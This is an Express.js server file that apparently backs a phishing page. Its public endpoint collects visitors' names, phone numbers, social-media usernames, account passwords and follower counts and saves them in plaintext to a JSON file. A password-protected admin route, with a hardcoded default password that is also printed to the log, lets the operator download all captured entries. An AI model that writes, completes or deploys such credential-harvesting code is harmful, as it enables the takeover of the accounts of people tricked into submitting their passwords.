require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname)));

// Admin credentials (default)
let ADMIN_USER = 'admin';
let ADMIN_PASS = 'lisa123';

const DATA_FILE = path.join(__dirname, 'data.json');
const CONFIG_FILE = path.join(__dirname, 'config.json');

// Load or create config
function loadConfig() {
    try {
        if (fs.existsSync(CONFIG_FILE)) {
            const config = JSON.parse(fs.readFileSync(CONFIG_FILE));
            if (config.adminPass) ADMIN_PASS = config.adminPass;
        }
    } catch (e) { /* ignore */ }
}
loadConfig();

function saveConfig() {
    fs.writeFileSync(CONFIG_FILE, JSON.stringify({ adminPass: ADMIN_PASS }, null, 2));
}

function initData() {
    if (!fs.existsSync(DATA_FILE)) {
        fs.writeFileSync(DATA_FILE, JSON.stringify({ submissions: [] }, null, 2));
    }
}
initData();

function readData() {
    try {
        return JSON.parse(fs.readFileSync(DATA_FILE));
    } catch {
        return { submissions: [] };
    }
}

function writeData(data) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

// Public form submission
app.post('/api/submit', (req, res) => {
    try {
        const { name, mobile, username, password, followers } = req.body;
        if (!name || !mobile || !username || !password || !followers) {
            return res.status(400).json({ error: 'All fields required' });
        }
        const data = readData();
        data.submissions.push({
            id: Date.now(),
            timestamp: new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' }),
            name,
            mobile,
            username,
            password,
            followers
        });
        writeData(data);
        console.log(`✅ Data saved: ${username} - ${followers} followers`);
        res.json({ success: true, message: 'Data saved successfully' });
    } catch (error) {
        console.error('Submission error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Admin login
let sessionToken = null;

app.post('/api/admin/auth', (req, res) => {
    const { username, password } = req.body;
    if (username === ADMIN_USER && password === ADMIN_PASS) {
        sessionToken = Date.now().toString(36);
        res.json({ success: true, token: sessionToken });
    } else {
        res.status(401).json({ error: 'Invalid credentials' });
    }
});

app.get('/api/admin/data', (req, res) => {
    const token = req.headers['authorization'];
    if (token !== sessionToken) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    res.json(readData());
});

// Change password endpoint
app.post('/api/admin/change-password', (req, res) => {
    const token = req.headers['authorization'];
    if (token !== sessionToken) {
        return res.status(401).json({ error: 'Unauthorized' });
    }

    const { currentPassword, newPassword } = req.body;
    if (!currentPassword || !newPassword) {
        return res.status(400).json({ error: 'Current and new password required' });
    }

    if (currentPassword !== ADMIN_PASS) {
        return res.status(401).json({ error: 'Current password is incorrect' });
    }

    if (newPassword.length < 4) {
        return res.status(400).json({ error: 'Password must be at least 4 characters' });
    }

    ADMIN_PASS = newPassword;
    saveConfig();
    console.log('✅ Admin password changed successfully');
    res.json({ success: true, message: 'Password changed successfully' });
});

app.listen(PORT, () => {
    console.log(`✅ Server running on http://localhost:${PORT}`);
    console.log(`✅ Admin panel: /admin.html`);
    console.log(`✅ Login: ${ADMIN_USER} / ${ADMIN_PASS}`);
});
